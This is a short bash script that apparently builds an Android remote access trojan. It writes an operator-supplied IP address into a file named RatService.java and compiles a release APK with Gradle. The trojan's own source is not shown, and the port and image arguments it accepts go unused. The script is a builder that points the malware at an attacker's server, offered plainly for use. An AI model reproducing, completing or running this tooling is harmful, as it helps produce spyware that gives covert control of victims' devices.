#!/bin/bash
IP=$1
PORT=$2
IMAGE=$3

# Inject IP/Port into Java source
sed -i "s/YOUR_IP_HERE/$IP/" client/RatService.java

# Build the APK using Gradle
./gradlew assembleRelease

echo "APK Built: app/build/outputs/apk/release/app-release.apk"

